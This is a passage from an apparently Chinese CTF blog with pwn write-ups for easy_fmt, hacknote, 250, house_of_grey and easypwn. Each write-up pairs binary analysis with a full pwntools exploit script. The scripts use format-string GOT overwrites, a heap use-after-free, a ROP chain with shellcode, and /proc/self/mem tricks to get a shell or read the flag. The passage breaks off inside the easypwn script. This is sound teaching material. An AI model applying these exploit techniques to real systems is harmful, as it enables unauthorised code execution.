<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109180726021.png" alt="image-20210109180726021"></p>
<p>但是由于有exit函数存在，格式化字符串只能使用一次。</p>
<p>程序的开始还有一个checkin函数，需要猜对这个数才行。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181044048.png" alt="image-20210109181044048"></p>
<h4 id="思路及利用-23"><a href="#思路及利用-23" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>题目没有后门函数，所以至少需要两次使用格式化字符串，一次泄露一次修改。</p>
<p>所以第一次，先将exit的plt修改为main地址，这样就可以重复利用格式化字符串漏洞。</p>
<p>对于checkin函数，是一个一位的数，我们直接固定一个不断重复就行。十分之一的概率并不低。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#sh = process(&#x27;./easy_fmt&#x27;)  </span></span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">40242</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyfmt&#x27;</span>)  </span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  </span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;enter:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#修改exit的got表，指向main+0x7C处，即形成一个循环，这样我们能继续使用printf  </span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="string">b&#x27;2434&#x27;</span> + <span class="string">b&#x27;c%10$hn&#x27;</span>  </span><br><span class="line">payload = payload.ljust(<span class="number">16</span>,<span class="string">b&#x27;b&#x27;</span>) + p64(exit_got)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#泄露read地址  </span></span><br><span class="line">payload = <span class="string">b&#x27;%10$sBBB&#x27;</span> + p64(read_got)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;slogan: &#x27;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;slogan: &#x27;</span>)  </span><br><span class="line">sh.recv(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">read_addr = u64(sh.recvuntil(<span class="string">&#x27;BBB&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#print hex(read_addr)  </span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)  </span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment"># print &#x27;libc_base=&#x27;,hex(libc_base)  </span></span><br><span class="line"><span class="comment"># print &#x27;system_addr=&#x27;,hex(system_addr)  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#修改printf的got表，只需修改低3字节即可到system  </span></span><br><span class="line">data = system_addr &amp; <span class="number">0xFF</span> </span><br><span class="line">s = <span class="built_in">str</span>(data) </span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">bytes</span>(s, encoding = <span class="string">&quot;utf8&quot;</span>) + <span class="string">b&#x27;c%14$hhn&#x27;</span>  </span><br><span class="line">data = ((system_addr &amp; <span class="number">0xFFFFFF</span>) &gt;&gt; <span class="number">8</span>) - data  </span><br><span class="line">s = <span class="built_in">str</span>(data) </span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">bytes</span>(s, encoding = <span class="string">&quot;utf8&quot;</span>) + <span class="string">b&#x27;c%15$hn&#x27;</span>  </span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">b&#x27;B&#x27;</span>) + p64(printf_got) + p64(printf_got+<span class="number">1</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;slogan: &#x27;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#get shell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;slogan: &#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181646152.png" alt="image-20210109181646152"></p>
<h3 id="30-hacknote"><a href="#30-hacknote" class="headerlink" title="30. hacknote"></a>30. hacknote</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181709858.png" alt="image-20210109181709858"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png" alt="image-20201201213201788"></p>
<h4 id="代码分析-25"><a href="#代码分析-25" class="headerlink" title="代码分析"></a>代码分析</h4><p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png" alt="image-20201201213310802"></p>
<p>删除堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png" alt="image-20201201213328651"></p>
<p>输出堆的内容：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213346639.png" alt="image-20201201213346639"></p>
<p>添加堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213401902.png" alt="image-20201201213401902"></p>
<p>自定义的输出函数</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213619289.png" alt="image-20201201213619289"></p>
<p>整个程序分析下来，流程大概是，有一个指针数组ptr。每次新建的时候，ptr申请一个起控制作用的0x8大小的堆（control_chunk），这个堆首先放入自定义的一个输出函数put，然后再指向相应的申请的size大小的存放内容的堆(data_chunk)。在删除时，并没用将指针置null，这里就有UAF漏洞。</p>
<p>而print函数中的<code>(*ptr[v1])(ptr[v1]);</code>实际上就是调用*ptr[v1]的函数（也就是自定义的put函数），ptr[v1]作为函数的参数。正常情况下，是输出ptr[v1+4]指向的内容，即输入的数据。</p>
<p>用图来说明关系：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png" alt="image-20201201214918029"></p>
<h4 id="思路及利用-24"><a href="#思路及利用-24" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
<p>也就是说，申请两个超过fastbin大小的chunk，然后释放。再申请0x8大小的chunk，这时候就可以向control_chunk进行写操作来执行需要的函数。（这里申请两个超过fastbin大小的chunk，是因为申请0x8的data_chunk还需要一个0x8的control_chunk，而且需要注意fastbin是采用单向链表维护，并且遵循<strong>后进先出</strong>的规则） </p>
<p>首先，需要泄露libc的基地址，这里可以利用自定义的put函数，输出got表项。这里选择free函数。</p>
<p>得到基地址后，只需要将control_chunk的fd改为system的地址，然后再写入参数‘sh’即可。这里就需要先将chunk2释放。但是进入fastbin的chunk仍是之前的两个，所以和之前一样，再次申请的chunk仍可以修改control_chunk1。</p>
<p>这里有一点需要注意的是，执行``(*ptr[v1])(ptr[v1])`时，相当于system（&amp;systemsh）显然是不能正确执行的。需要用一点小技巧，改为system（&amp;system||sh）。</p>
<p>图片演示过程：</p>
<ul>
<li>申请两个chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201222619001.png" alt="image-20201201222619001"></p>
<ul>
<li>依次删除0、1后再申请0x8的chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223133135.png" alt="image-20201201223133135"></p>
<p><strong>这时候就可以通过ptr[2]向control_chunk0写入数据。</strong></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">30500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">free_got= elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">put = <span class="number">0x804862b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(put)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libcbase=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">payload = p32(system)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223434405.png" alt="image-20201201223434405"></p>
<h3 id="31-250"><a href="#31-250" class="headerlink" title="31. 250"></a>31. 250</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181948534.png" alt="image-20210109181939783"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109182000707.png" alt="image-20210109182000707"></p>
<h4 id="代码分析-26"><a href="#代码分析-26" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序很简单，确定输入的大小，然后输入数据，最后打印输入的数据。</p>
<p>在打印函数中发现漏洞，一个明显的栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109195804597.png" alt="image-20210109195804597"></p>
<h4 id="思路及分析-1"><a href="#思路及分析-1" class="headerlink" title="思路及分析"></a>思路及分析</h4><p>整个程序是静态编译，那么有很多方法获得shell。</p>
<p>而漏洞也是简单的栈溢出，这里选择一个比较特别的方式来得到shell，程序开启了堆栈不可执行，但是可以使用dl_make_stack_executable使得栈变得可执行。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109200342787.png" alt="image-20210109200342787"></p>
<p>也就是将返回地址覆盖，转而执行l_make_stack_executable。为了不考虑参数ret到0x809a260：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109200915311.png" alt="image-20210109200915311"></p>
<p>我们还得事先设置好ebp的值，使得[ebp+arg_10]为__libc_stack_end的地址，目的是为了绕过这里的检查</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109201009960.png" alt="image-20210109201009960"></p>
<p>接下来利用gadgets修改_dl_make_stack_executable_hook的值。</p>
<p>这样ret时，就会不到原来的地方，而是回到栈里的ROP gadgets</p>
<p>于是，我们再用jmp esp来继续跳转到栈里，执行shellcode</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">54634</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./250&#x27;</span>)  </span><br><span class="line">_dl_make_stack_executable_hook = elf.symbols[<span class="string">&#x27;_dl_make_stack_executable_hook&#x27;</span>]  </span><br><span class="line"></span><br><span class="line">call_dl_make_stack_executable = <span class="number">0x809A260</span>  </span><br><span class="line"><span class="comment">#inc dword ptr [ecx] ; ret  </span></span><br><span class="line">inc_p_ecx = <span class="number">0x080845f8</span>  </span><br><span class="line">pop_ecx = <span class="number">0x080df1b9</span>  </span><br><span class="line">jmp_esp = <span class="number">0x080de2bb</span>  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;SSCTF[InPut Data Size]&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x3A</span> + p32(<span class="number">0x80A0B05</span> - <span class="number">0x18</span>)  </span><br><span class="line"><span class="comment">#修改_dl_make_stack_executable_hook，偏移一个push，这样ret时就不会返回到原来的位置  </span></span><br><span class="line">payload += p32(pop_ecx) + p32(_dl_make_stack_executable_hook) + p32(inc_p_ecx)  </span><br><span class="line"><span class="comment">#调用_dl_make_stack_executable让栈变得可执行，并跳到栈里继续执行shellcode  </span></span><br><span class="line">payload += p32(call_dl_make_stack_executable) + p32(jmp_esp)  </span><br><span class="line"><span class="comment">#shellcode  </span></span><br><span class="line">payload += asm(shellcraft.i386.linux.sh())  </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;SSCTF[YourData]&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109201354062.png" alt="image-20210109201354062"></p>
<h2 id="七分题"><a href="#七分题" class="headerlink" title="七分题"></a>七分题</h2><h3 id="32-house-of-grey"><a href="#32-house-of-grey" class="headerlink" title="32. house_of_grey"></a>32. house_of_grey</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203109876.png" alt="image-20210109203109876"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203136022.png" alt="image-20210109203136022"></p>
<h4 id="代码分析-27"><a href="#代码分析-27" class="headerlink" title="代码分析"></a>代码分析</h4><p>整个程序的是一个读取文件并显示的程序，除了flag文件，其他文件都可以读取。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203629494.png" alt="image-20210109203629494"></p>
<p>找到一个溢出点</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203723958.png" alt="image-20210109203723958"></p>
<p>还有buf也可以溢出</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203816411.png" alt="image-20210109203816411"></p>
<p>两个结合，就可以通过溢出buf修改v8，利用选项4实现任意地址的写。</p>
<p>lseek是一个用于改变读写一个文件时读写指针位置的一个系统调用。指针位置可以是绝对的或者相对的。选项2可以指定文件读写指针的位置。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109204009502.png" alt="image-20210109204009502"></p>
<h4 id="思路及利用-25"><a href="#思路及利用-25" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>程序保护全开，所以要获得shell，只能利用栈溢出进行rop。而要进行rop就要知道程序基地址（由于开了PIE）和mmap映射区域地址（我们要读mem）。</p>
<p>这里就需要了解maps和mem。</p>
<p>Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>
<p>读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p>
<p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。</p>
<p>首先可以通过输入<code>/proc/self/maps</code>获得程序基地址（第一行），heap基地址（第四行），mmap映射区域的地址（第五行）还有libc链接基地址（第六行）。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109204912476.png" alt="image-20210109204912476"></p>
<p>然后就是读取men，我们把文件指针改为mmap地址后就可以读取mem了，这里我们主要是要读取出我们的v8的值，而函数的返回地址就在v8 - 0x38的地方。</p>
<p>我们在功能一时把‘/proc/self/mem’放到了buf字段里，而v8也在这里，并且距离buf字段0x50 - 0x38 = 0x18。所以，我们只要找到字符串‘proc/self/mem’就可以拿到v8的地址了。</p>
<p>然而这个程序只能运行30次，还需要两次进行字符填充，所以这里我们只能使用24次来搜索字符串‘proc/self/mem’了。<br>这样我们就不能保证脚本每次攻击能成功，但概率还是在可以接受的范围之内的。</p>
<p>之后就是常规rop。填充v8指针为返回地址，通过功能四对v8指针的调用劫持程序流程，使得程序执行我们的ROP链，达到输出flag的目的。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41119</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_grey&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find</span>(<span class="params">buf</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;So man, what are you finding?\n&#x27;</span>, <span class="built_in">str</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Locate</span>(<span class="params">buf</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;So, Where are you?\n&#x27;</span>, <span class="built_in">str</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;How many things do you want to get?\n&#x27;</span>, <span class="string">&#x27;100000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;What do you want to give me?\n&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Do you want to help me build my room? Y/n?\n&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">Find(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">get()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;-&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">open_ad = elf.sym[<span class="string">&#x27;open&#x27;</span>] + elf_base</span><br><span class="line">read_ad = elf.sym[<span class="string">&#x27;read&#x27;</span>] + elf_base</span><br><span class="line">prdi = elf_base + <span class="number">0x0000000000001823</span></span><br><span class="line">prsi_r15 = elf_base + <span class="number">0x0000000000001821</span></span><br><span class="line">puts_ad = elf.sym[<span class="string">&#x27;puts&#x27;</span>] + elf_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;heap&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">    	line = p.recvline()</span><br><span class="line">        mmap_ad = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Find(<span class="string">&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">Locate(mmap_ad)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    mem = p.recvuntil(<span class="string">&#x27;1.Find&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> mem:</span><br><span class="line">        bef = mem.split(<span class="string">&#x27;/proc/self/mem&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        v8_ad = mmap_ad + i * <span class="number">100000</span> + <span class="built_in">len</span>(bef)</span><br><span class="line">        ret_ad = v8_ad - <span class="number">0x38</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> i ==<span class="number">23</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;No!No!No!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/proc/self/mem&quot;</span>.ljust(<span class="number">0x18</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(ret_ad)</span><br><span class="line">Find(payload)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x8</span> * <span class="number">15</span></span><br><span class="line">flag_ad = ret_ad + offset</span><br><span class="line"></span><br><span class="line">payload = p64(prdi) + p64(flag_ad) + p64(prsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(open_ad)</span><br><span class="line">payload += p64(prdi) + p64(<span class="number">6</span>) + p64(prsi_r15) + p64(flag_ad) + p64(<span class="number">0</span>) + p64(read_ad)</span><br><span class="line">payload += p64(prdi) + p64(flag_ad) + p64(puts_ad)</span><br><span class="line">payload += <span class="string">&#x27;/home/ctf/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">give(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109210038613.png" alt="image-20210109210038613"></p>
<h3 id="33-easypwn"><a href="#33-easypwn" class="headerlink" title="33. easypwn"></a>33. easypwn</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201225035214.png" alt="image-20201201225035214"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209094754572.png" alt="image-20201209094754572"></p>
<p>RELRO部分开启，可以改写GOT表。</p>
<h4 id="代码分析-28"><a href="#代码分析-28" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095207906.png" alt="image-20201209095207906"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095323845.png" alt="image-20201209095323845"></p>
<p>可以看到，read的范围很大，但是没法溢出栈底。</p>
<blockquote>
<p><strong>int snprintf(char *str, size_t size, const char *format, …)</strong> 设将可变参数(…)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。</p>
</blockquote>
<p>因此，通过snprintf可以将v2溢出覆盖v3。</p>
<h4 id="思路及利用-26"><a href="#思路及利用-26" class="headerlink" title="思路及利用"></a>思路及利用</h4><blockquote>
<p>通过实验发现，程序应该是使用的libc-2.23，需在相应环境下进行调试。</p>
</blockquote>
<p>v3是格式化字符串，上述分析知道可以将v3改写。利用格式化字符串做到任意地址读写。</p>
<p>这里涉及到snprintf函数的原理。</p>
<blockquote>
<p>snprintf把格式化字符串的地址记下来，然后，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符。</p>
</blockquote>
<p>这里地址没有改变，只是地址指向的内容变了。因此，v3改变了，整个格式化字符串就跟着变了。而不是先传入“%s”，snprintf函数就执行“%s”。</p>
<p>有了格式化字符串之后，就考虑如何得到shell。</p>
<p>目前已知，能够改写got表，能够任意地址写。很自然的想到改写某个函数的got为system。同时如之前的‘’greeting-150”，需要考虑到传参问题。</p>
<p>选择free函数的got改为system的plt，在“Input Your Name:”中输入“/bin/sh”。这样执行free（buf），就能得到shell。</p>
<p>整个程序没有使用system，需要先泄露地址。</p>
<p>分析在执行snprintf，且尚未对rsp进行调整时的栈情况：</p>
<p>输入为“aaaa”</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209104042184.png" alt="image-20201209104042184"></p>
<p>发现，可以泄露__libc_start_main+240的地址。</p>
<p>计算偏移：(0x7fffffffdfe8-0x7fffffffd380)/8=397</p>
<p>同样获得init的地址。</p>
<p>这样就可以泄露libc，然后就是修改free的got表。</p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">40691</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">payload</span>):</span></span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Input Your Code:\n&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>)	</span><br><span class="line">	r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">name</span>):</span></span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Input Your Code:\n&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Input Your Name:\n&quot;</span>)	</span><br><span class="line">	r.sendline(name)</span><br><span class="line"></span><br><span class="line">setName(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_num = <span class="number">0x7f8</span> - <span class="number">0x410</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + <span class="string">&#x27;bb%397$p&#x27;</span></span><br><span class="line">echo(payload)</span><br><span class="line"><span class="built_in">print</span> r.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">main_return = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">libc_base = (main_return - <span class="number">0xF0</span>) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free = libc_base + libc.symbols[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span 